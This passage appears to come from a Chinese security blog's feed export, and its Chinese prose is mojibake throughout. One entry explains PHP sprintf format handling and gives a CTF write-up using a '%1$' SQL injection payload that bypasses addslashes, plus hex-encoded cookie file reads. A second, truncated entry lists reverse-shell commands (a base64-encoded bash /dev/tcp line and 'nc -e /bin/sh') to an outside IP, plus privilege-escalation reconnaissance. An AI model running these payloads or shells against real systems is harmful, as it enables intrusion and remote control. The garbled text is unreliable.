åå…­è¿›åˆ¶æ•°ï¼ˆå°å†™å­—æ¯ï¼‰<br/><br/>%X - åå…­è¿›åˆ¶æ•°ï¼ˆå¤§å†™å­—æ¯ï¼‰<br/><br/>é™„åŠ çš„æ ¼å¼å€¼ã€‚å¿…éœ€æ”¾ç½®åœ¨ % å’Œå­—æ¯ä¹‹é—´ï¼ˆä¾‹å¦‚ %.2fï¼‰ï¼š<br/><br/>+ ï¼ˆåœ¨æ•°å­—å‰é¢åŠ ä¸Š + æˆ– - æ¥å®šä¹‰æ•°å­—çš„æ­£è´Ÿæ€§ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œåªæœ‰è´Ÿæ•°æ‰åšæ ‡è®°ï¼Œæ­£æ•°ä¸åšæ ‡è®°ï¼‰<br/><br/>â€˜ ï¼ˆè§„å®šä½¿ç”¨ä»€ä¹ˆä½œä¸ºå¡«å……ï¼Œé»˜è®¤æ˜¯ç©ºæ ¼ã€‚å®ƒå¿…é¡»ä¸å®½åº¦æŒ‡å®šå™¨ä¸€èµ·ä½¿ç”¨ã€‚ä¾‹å¦‚ï¼š%â€™x20sï¼ˆä½¿ç”¨ â€œxâ€ ä½œä¸ºå¡«å……ï¼‰ï¼‰<br/><br/>- ï¼ˆå·¦è°ƒæ•´å˜é‡å€¼ï¼‰<br/><br/>[0-9] ï¼ˆè§„å®šå˜é‡å€¼çš„æœ€å°å®½åº¦ï¼‰<br/><br/>.[0-9] ï¼ˆè§„å®šå°æ•°ä½æ•°æˆ–æœ€å¤§å­—ç¬¦ä¸²é•¿åº¦ï¼‰<br/><br/>æ³¨é‡Šï¼šå¦‚æœä½¿ç”¨å¤šä¸ªä¸Šè¿°çš„æ ¼å¼å€¼ï¼Œå®ƒä»¬å¿…é¡»æŒ‰ç…§ä»¥ä¸Šé¡ºåºä½¿ç”¨<br/></td></tr><tr><td align="center">arg1</td><td align="left">å¦‚æœ<code>format</code>ä¸­æœ‰å ä½ç¬¦ï¼ˆå¦‚ <code>%s</code>ã€<code>%d</code> ç­‰ï¼‰ï¼Œè¿™ä¸ªå‚æ•°æ˜¯å¿…éœ€çš„ï¼Œè§„å®šæ’åˆ° <em>format</em> å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ª % ç¬¦å·å¤„çš„å‚æ•°</td></tr><tr><td align="center">arg2</td><td align="left">å¯é€‰ï¼Œè§„å®šæ’åˆ° <em>format</em> å­—ç¬¦ä¸²ä¸­ç¬¬äºŒä¸ª % ç¬¦å·å¤„çš„å‚æ•°</td></tr></tbody></table><h3 id="å¸¸è§ç”¨æ³•"><a href="#å¸¸è§ç”¨æ³•" class="headerlink" title="å¸¸è§ç”¨æ³•"></a>å¸¸è§ç”¨æ³•</h3><ul><li><strong>æ ¼å¼åŒ–æ•°å­—</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-variable">$num</span> = <span class="hljs-number">123.456</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%.2f&quot;</span>, <span class="hljs-variable">$num</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-comment">// è¾“å‡º 123.46ï¼Œå°†æ•°å­—æ ¼å¼åŒ–ä¸ºä¿ç•™ä¸¤ä½å°æ•°çš„å­—ç¬¦ä¸²</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331135554907.png" alt="image-20250331135554907"></p><ul><li><strong>æ‹¼æ¥å­—ç¬¦ä¸²å’Œå˜é‡</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;John&quot;</span>;<br><span class="hljs-variable">$age</span> = <span class="hljs-number">30</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;My name is %s and I&#x27;m %d years old.&quot;</span>, <span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-comment">// è¾“å‡º My name is John and I&#x27;m 30 years old.</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331135700220.png" alt="image-20250331135700220"></p><ul><li><strong>æ ¼å¼åŒ–æ—¥æœŸ</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$timestamp</span> = <span class="hljs-title function_ invoke__">time</span>();<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%02d-%02d-%d&quot;</span>, <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-variable">$timestamp</span>), <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-variable">$timestamp</span>), <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-variable">$timestamp</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-comment">// è¾“å‡ºå½“å‰æ—¥æœŸï¼Œæ ¼å¼ä¸º mm-dd-yyyy</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331135759133.png" alt="image-20250331135759133"></p><h1 id="sprintfå‡½æ•°å­˜åœ¨çš„æ¼æ´"><a href="#sprintfå‡½æ•°å­˜åœ¨çš„æ¼æ´" class="headerlink" title="sprintfå‡½æ•°å­˜åœ¨çš„æ¼æ´"></a><code>sprintf</code>å‡½æ•°å­˜åœ¨çš„æ¼æ´</h1><h2 id="å ä½ç¬¦æ¼æ´"><a href="#å ä½ç¬¦æ¼æ´" class="headerlink" title="å ä½ç¬¦æ¼æ´"></a>å ä½ç¬¦æ¼æ´</h2><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°åœ¨å¤„ç†å ä½ç¬¦æ—¶ï¼Œä¼šæŒ‰ç…§ç‰¹å®šè§„åˆ™å°†ä¼ å…¥çš„å‚æ•°æ›¿æ¢åˆ°å ä½ç¬¦æ‰€åœ¨çš„ä½ç½®ï¼Œå½“ç”¨æˆ·èƒ½å¤Ÿæ§åˆ¶æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ˆåŒ…å«å ä½ç¬¦ï¼‰æˆ–éƒ¨åˆ†å‚æ•°æ—¶ï¼Œå°±å¯èƒ½å‡ºç°å®‰å…¨é—®é¢˜ã€‚</p><p>æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ç‰¹æ®Šæ„é€ çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥è¯»å–å†…å­˜ä¸­çš„æ•æ„Ÿä¿¡æ¯ã€ä¿®æ”¹å†…å­˜æ•°æ®ã€ç”šè‡³æ‰§è¡Œä»»æ„ä»£ç ã€‚</p><h3 id="1"><a href="#1" class="headerlink" title="%1$"></a><code>%1$</code></h3><p><code>%1$</code>æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­çš„ä¸€ç§é«˜çº§å ä½ç¬¦ç”¨æ³•ï¼Œåœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­ï¼Œ<code>%</code>é€šå¸¸æ˜¯å ä½ç¬¦çš„èµ·å§‹ç¬¦å·ã€‚<code>%1$</code> ä¸­çš„ <code>1</code> ä»£è¡¨å‚æ•°åˆ—è¡¨ä¸­çš„ç¬¬ 1 ä¸ªå‚æ•°ï¼ˆç¼–å·ä» 1 å¼€å§‹ï¼‰ï¼Œ<code>$</code> æ˜¯åˆ†éš”ç¬¦ï¼Œå®ƒçš„ä½œç”¨æ˜¯æ˜ç¡®æŒ‡å®šè¦ä½¿ç”¨çš„å‚æ•°åºå·ã€‚å€ŸåŠ©è¿™ç§æ–¹å¼ï¼Œä½ èƒ½å¤Ÿç²¾ç¡®æ§åˆ¶åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­ä½¿ç”¨å“ªä¸ªå‚æ•°è¿›è¡Œæ›¿æ¢ï¼Œè¿˜å¯ä»¥å¤šæ¬¡ä½¿ç”¨åŒä¸€ä¸ªå‚æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-title function_ invoke__">sprintf</span>(format, arg1, arg2, arg++)<br></code></pre></td></tr></table></figure><p>arg1ã€arg2ã€++ å‚æ•°å°†è¢«æ’å…¥åˆ°ä¸»å­—ç¬¦ä¸²ä¸­çš„ç™¾åˆ†å·ï¼ˆ%ï¼‰ç¬¦å·å¤„ã€‚è¯¥å‡½æ•°æ˜¯é€æ­¥æ‰§è¡Œçš„ã€‚åœ¨ç¬¬ä¸€ä¸ª % ç¬¦å·å¤„ï¼Œæ’å…¥ arg1ï¼Œåœ¨ç¬¬äºŒä¸ª % ç¬¦å·å¤„ï¼Œæ’å…¥ arg2ï¼Œä¾æ­¤ç±»æ¨ã€‚</p><p><strong>å¦‚æœ % ç¬¦å·å¤šäº arg å‚æ•°ï¼Œåˆ™æ‚¨å¿…é¡»ä½¿ç”¨å ä½ç¬¦ã€‚å ä½ç¬¦ä½äº % ç¬¦å·ä¹‹åï¼Œç”±æ•°å­—å’Œ â€œ$â€ ç»„æˆ</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;a=%2\$s, b=%1\$s&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>);<br><span class="hljs-comment">// æ‰§è¡Œç»“æœä¸ºï¼ša=b, b=a</span><br></code></pre></td></tr></table></figure><p><code>%2\$s</code> è¡¨ç¤ºå°†ç¬¬ 2 ä¸ªå‚æ•°ï¼ˆå³ <code>&quot;b&quot;</code> ï¼‰ä»¥å­—ç¬¦ä¸²ç±»å‹æ’å…¥ï¼Œ<code>%1\$s</code> è¡¨ç¤ºå°†ç¬¬ 1 ä¸ªå‚æ•°ï¼ˆå³ <code>&quot;a&quot;</code> ï¼‰ä»¥å­—ç¬¦ä¸²ç±»å‹æ’å…¥ã€‚æ‰€ä»¥æœ€ç»ˆè¾“å‡º <code>a=b, b=a</code> ã€‚ å…¶ä¸­ <code>\</code> æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œç”¨æ¥è½¬ä¹‰ <code>$</code> ï¼Œé˜²æ­¢å®ƒè¢« shell ç­‰ç¯å¢ƒæå‰è§£æ ï¼Œç¡®ä¿ <code>sprintf</code> å‡½æ•°èƒ½æ­£ç¡®è¯†åˆ«å ä½ç¬¦ã€‚ è€Œ <code>%2$s</code> é‡Œçš„ <code>2</code> æŒ‡æ˜ç”¨ç¬¬ 2 ä¸ªå‚æ•°ï¼Œ<code>s</code> è¡¨æ˜å‚æ•°ç±»å‹ä¸ºå­—ç¬¦ä¸²ã€‚</p><h3 id="sprintfåº•å±‚å®ç°ä»£ç "><a href="#sprintfåº•å±‚å®ç°ä»£ç " class="headerlink" title="sprintfåº•å±‚å®ç°ä»£ç "></a><code>sprintf</code>åº•å±‚å®ç°ä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-keyword">switch</span> (format[inpos]) &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>:<br>    &#123;<br>        zend_string * t;<br>        zend_string * str = <span class="hljs-title function_ invoke__">zval_get_tmp_string</span>(tmp, &amp;t);<br>        <span class="hljs-title function_ invoke__">php_sprintf_appendstring</span>( &amp; result, &amp;outpos, <span class="hljs-title function_ invoke__">ZSTR_VAL</span>(str), width, precision, padding, alignment, <span class="hljs-title function_ invoke__">ZSTR_LEN</span>(str), <span class="hljs-number">0</span>, expprec, <span class="hljs-number">0</span>);<br>        <span class="hljs-title function_ invoke__">zend_tmp_string_release</span>(t);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;d&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">php_sprintf_appendint</span>( &amp; result, &amp;outpos, <span class="hljs-title function_ invoke__">zval_get_long</span>(tmp), width, padding, alignment, always_sign);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;u&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">php_sprintf_appenduint</span>( &amp; result, &amp;outpos, <span class="hljs-title function_ invoke__">zval_get_long</span>(tmp), width, padding, alignment);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;g&#x27;</span>:<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;G&#x27;</span>:<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;e&#x27;</span>:<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;E&#x27;</span>:<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;f&#x27;</span>:<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;F&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">php_sprintf_appenddouble</span>( &amp; result, &amp;outpos, <span class="hljs-title function_ invoke__">zval_get_double</span>(tmp), width, padding, alignment, precision, adjusting, format[inpos], always_sign);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;c&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">php_sprintf_appendchar</span>( &amp; result, &amp;outpos, (char) <span class="hljs-title function_ invoke__">zval_get_long</span>(tmp));<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;o&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">php_sprintf_append2n</span>( &amp; result, &amp;outpos, <span class="hljs-title function_ invoke__">zval_get_long</span>(tmp), width, padding, alignment, <span class="hljs-number">3</span>, hexchars, expprec);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;x&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">php_sprintf_append2n</span>( &amp; result, &amp;outpos, <span class="hljs-title function_ invoke__">zval_get_long</span>(tmp), width, padding, alignment, <span class="hljs-number">4</span>, hexchars, expprec);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;X&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">php_sprintf_append2n</span>( &amp; result, &amp;outpos, <span class="hljs-title function_ invoke__">zval_get_long</span>(tmp), width, padding, alignment, <span class="hljs-number">4</span>, HEXCHARS, expprec);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;b&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">php_sprintf_append2n</span>( &amp; result, &amp;outpos, <span class="hljs-title function_ invoke__">zval_get_long</span>(tmp), width, padding, alignment, <span class="hljs-number">1</span>, hexchars, expprec);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;%&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">php_sprintf_appendchar</span>( &amp; result, &amp;outpos, <span class="hljs-string">&#x27;%&#x27;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-keyword">break</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>é€šè¿‡åº•å±‚å®ç°ä»£ç å¯ä»¥å‘ç°ï¼Œ<code>sprintfï¼ˆï¼‰</code>æ–¹æ³•å°±æ˜¯å¯¹15ç§ç±»å‹åšäº†åŒ¹é…ï¼Œ15ç§ç±»å‹ä»¥å¤–çš„å°±ç›´æ¥breakäº†æ²¡æœ‰åšä»»ä½•å¤„ç†ï¼Œæ‰€ä»¥å°±ä¼šå¯¼è‡´ä¸€ä¸ªé—®é¢˜ï¼š</p><p>å¦‚æœæˆ‘ä»¬è¾“å…¥<code>%</code>\æˆ–è€…<code>%1$\</code>,ä»–ä¼šæŠŠåæ–œæ å½“åšæ ¼å¼åŒ–å­—ç¬¦çš„ç±»å‹ï¼Œç„¶è€Œæ‰¾ä¸åˆ°åŒ¹é…çš„é¡¹é‚£ä¹ˆ<code>%\</code>,<code>%1$\</code>å°±å› ä¸ºæ²¡æœ‰ç»è¿‡ä»»ä½•å¤„ç†è€Œè¢«æ›¿æ¢ä¸ºç©ºã€‚</p><p>å› æ­¤<code>sprintf</code>æ³¨å…¥çš„åŸç†å°±æ˜¯ç”¨ä¸€ä¸ª15ç§ç±»å‹ä¹‹å¤–çš„<code>\</code>æ¥ä»£æ›¿æ ¼å¼å­—ç¬¦ç±»å‹è®©å‡½æ•°æ›¿æ¢ä¸ºç©ºï¼Œåˆ™<code>%1$\&#39;</code>åé¢çš„å•å¼•å·å°±èƒ½é—­åˆå‰é¢çš„å•å¼•å·ã€‚</p><p>æ­¤å¤–ï¼Œè¿˜è¦æ³¨æ„**å‡½æ•°<code>addslashes()</code>**ä½œç”¨æ˜¯è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ã€‚é¢„å®šä¹‰å­—ç¬¦æ˜¯å•å¼•å·<code>&#39;</code>ã€åŒå¼•å·<code>&quot;</code>ã€åæ–œæ <code>\</code>ã€<code>NULL</code>ã€‚æ¯”å¦‚ä¸‹é¢çš„ä»£ç ï¼Œè¿™æ ·å°±é€ æˆäº†å¾—ç»“æœæ˜¯æˆ‘ä»¬æ— æ³•åœ¨æ³¨å…¥çš„è¿‡ç¨‹å½“ä¸­ä½¿ç”¨å•å¼•å·ï¼ˆâ€™ï¼‰</p><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331182802265.png" alt="image-20250331182802265"></p><h1 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h1><p>é¢˜ç›®æ¥æº</p><blockquote><p>NSSCTFâ€“gitæ³„éœ²</p></blockquote><p>è¿™æ˜¯è¿™é¢˜çš„ååŠéƒ¨åˆ†çš„è€ƒç‚¹ï¼Œæºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$pass</span>=<span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;and pass=&#x27;%s&#x27;&quot;</span>,<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]));<br><span class="hljs-variable">$sql</span>=<span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;select * from user where name=&#x27;%s&#x27; <span class="hljs-subst">$pass</span>&quot;</span>,<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å®¡è®¡ä»£ç ï¼Œè¿™æ®µä»£ç é€šè¿‡<code>GET</code>è¯·æ±‚çš„<code>name</code>å’Œ<code>pass</code>å‚æ•°ï¼Œæ„é€ ä¸€æ¡<code>SQL</code>æŸ¥è¯¢è¯­å¥ï¼Œä» <code>user</code> è¡¨ä¸­ç­›é€‰å‡ºç¬¦åˆç‰¹å®šæ¡ä»¶çš„è®°å½•ã€‚</p><p><code>payload</code>å¦‚ä¸‹</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">name</span>=<span class="hljs-string">&#x27;admin&#x27;</span>&amp;pass=123%1$&#x27; <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1--+<br></code></pre></td></tr></table></figure><p><strong><code>addslashes()</code>å°†â€™è½¬ä¹‰æˆ&#39; åˆ™passpass&#x3D;123%1$&#39;</strong></p><p>æœ€ç»ˆæ„é€ çš„SQLè¯­å¥å¦‚ä¸‹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">and</span> pass<span class="hljs-operator">=</span><span class="hljs-string">&#x27;123&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">--+&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331184548380.png" alt="image-20250331184548380"></p><p>å¯ä»¥çœ‹åˆ°è·³è½¬åˆ°<code>wjbh.php</code>è¿™ä¸ªé¡µé¢äº†ï¼Œè™½ç„¶è¡¨é¢ä¸Šçœ‹ç€æ˜¯<code>Not Found</code>ï¼Œä½†è¿™å®é™…æ˜¯å‡ºé¢˜äººå†™æ¥æ··æ·†çš„ï¼ŒæŠ“åŒ…å¯ä»¥çŸ¥é“çŠ¶æ€ç æ˜¯200ï¼ŒæŸ¥çœ‹æºç å¯ä»¥çœ‹åˆ°<code>flag</code>çš„ä½ç½®åœ¨<code>/flag</code></p><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331184805384.png" alt="image-20250331184805384"></p><p>ä½†æ˜¯è®¿é—®åå´å‘ç°åˆå›åˆ°æœ€åˆçš„ç•Œé¢äº†</p><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331184936727.png" alt="image-20250331184936727"></p><p>é‚£å°±å»æŠ“åŒ…çœ‹çœ‹</p><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331185243464.png" alt="image-20250331185243464"></p><p>å‘ç°<code>cookie</code>è¯·æ±‚å¤´ä¸­æœ‰ä¸€ä¸ªå‚æ•°<code>file</code>ï¼Œå¯¹å…¶å€¼è¿›è¡Œ Hex è§£ç </p><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331185501796.png" alt="image-20250331185501796"></p><p>è§£å‡º<code>flag.txt</code>ï¼Œè®¿é—®åˆæ˜¯ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œå†ç»§ç»­æŠ“åŒ…</p><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331185545261.png" alt="image-20250331185545261"></p><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331185805000.png" alt="image-20250331185805000"></p><p>æ²¡ä»€ä¹ˆåŒºåˆ«ï¼Œçœ‹åˆ°ä¹‹å‰çš„<code>cookie</code>å‚æ•°<code>file</code>ï¼Œæƒ³åˆ°æ˜¯ä¸æ˜¯ç”¨æ¥è¯»å–<code>flag.txt</code>è¿™ä¸ªæ–‡ä»¶çš„ï¼Œä½†æ˜¯æ²¡æœ‰è¯»åˆ°ï¼Œè¦æ˜¯ç»™å®ƒåŠ ä¸Šä¼ªåè®®è¯»å–å‘¢</p><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331190020446.png" alt="image-20250331190020446"></p><p>è¿˜æ˜¯ä¸è¡Œ</p><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331190440729.png" alt="image-20250331190440729"></p><p>æƒ³åˆ°ä¹‹å‰çš„æç¤ºåœ¨<code>/flag</code>æ–‡ä»¶ä¸­ï¼Œé‚£å°±è¯»å–è¿™ä¸ªæ–‡ä»¶</p><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331190532826.png" alt="image-20250331190532826"></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">file</span><span class="hljs-operator">=</span><span class="hljs-number">2</span>f666c6167<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331190609726.png" alt="image-20250331190609726"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfshow</span>&#123;<span class="hljs-number">31</span>ba3d58-<span class="hljs-number">60</span>d3-<span class="hljs-number">40</span>f8-<span class="hljs-number">9</span>e39-<span class="hljs-number">291</span>c554cdf46&#125;<br></code></pre></td></tr></table></figure><p>è¿™å°±å‡ºflagäº†ï¼Œå¥½éš¾çš„èŒæ–°èµ›</p>]]></content>
    
    
    <categories>
      
      <category>å°çŸ¥è¯†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å°çŸ¥è¯†</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ææƒ</title>
    <link href="/2025/04/25/%E6%8F%90%E6%9D%83/"/>
    <url>/2025/04/25/%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h2 id="ç”¨VPSåå¼¹shell"><a href="#ç”¨VPSåå¼¹shell" class="headerlink" title="ç”¨VPSåå¼¹shell"></a>ç”¨VPSåå¼¹shell</h2><p><strong>æ”»å‡»æœºç›‘å¬ç«¯å£</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 2333<br></code></pre></td></tr></table></figure><p><strong>ç›®æ ‡æœº</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">127.0.0.1 | <span class="hljs-built_in">echo</span> YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMjIuNzUuMTI2LzIzMzMgMD4mMQ== | <span class="hljs-built_in">base64</span> -d| /bin/bash<br>127.0.0.1 | <span class="hljs-built_in">echo</span> bash -i &gt;&amp; /dev/tcp/47.122.75.126/2333 0&gt;&amp;1<br>nc -e /bin/sh 47.122.75.126 2333<br></code></pre></td></tr></table></figure><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><h3 id="å·²çŸ¥ä¸€ä¸ªç”¨æˆ·çš„å¯†ç "><a href="#å·²çŸ¥ä¸€ä¸ªç”¨æˆ·çš„å¯†ç " class="headerlink" title="å·²çŸ¥ä¸€ä¸ªç”¨æˆ·çš„å¯†ç "></a><strong>å·²çŸ¥ä¸€ä¸ªç”¨æˆ·çš„å¯†ç </strong></h3><ul><li>ç”¨<code>cat /etc/passwd</code>å‘½ä»¤æ¥æŸ¥çœ‹ç”¨æˆ·</li><li>ç”¨<code>su ç”¨æˆ·å</code>å‘½ä»¤æ¥åˆ‡æ¢ç”¨æˆ·ï¼Œå°è¯•å‡ºå·²çŸ¥çš„å¯†ç æ˜¯å“ªä¸€ä¸ªç”¨æˆ·çš„</li><li>ç”¨<code>sudo -l</code>å‘½ä»¤æ¥æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„æƒé™</li></ul><h3 id="taråŒ…ææƒ"><a href="#taråŒ…ææƒ" class="headerlink" title="taråŒ…ææƒ"></a><strong>taråŒ…ææƒ</strong></h3><p>å¦‚æœç®¡ç†å‘˜ç»™äºˆäº†æŸä¸ªæ™®é€šç”¨æˆ·tarå‘½ä»¤çš„è¶…çº§ç®¡ç†å‘˜æ“ä½œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 